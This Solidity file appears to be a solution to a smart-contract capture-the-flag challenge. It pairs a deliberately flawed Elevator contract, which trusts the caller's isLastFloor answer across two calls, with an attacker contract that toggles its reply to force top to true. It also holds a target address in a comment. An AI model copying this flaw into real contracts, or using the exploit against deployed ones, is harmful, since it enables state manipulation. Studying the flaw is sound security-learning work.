// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Building {
    function isLastFloor(uint256) external returns (bool);
}

contract Elevator {
    bool public top;
    uint256 public floor;

    function goTo(uint256 _floor) public {
        Building building = Building(msg.sender);

        if (!building.isLastFloor(_floor)) {
            floor = _floor;
            top = building.isLastFloor(floor);
        }
    }
}

contract BuildingContract is Building {
    // 0x6cec29F9fe356818a758C46f53c0c26f18A9899b
    bool lastFloor;
    Elevator elevator;

    constructor(address addr) public {
        elevator = Elevator(addr);
    }

    function isLastFloor(uint256) external override returns (bool) {
        bool currLastFloor = lastFloor;
        lastFloor = !lastFloor;
        return currLastFloor;
    }

    function elevatorGoTo(uint256 _floor) public {
        elevator.goTo(_floor);
    }
}
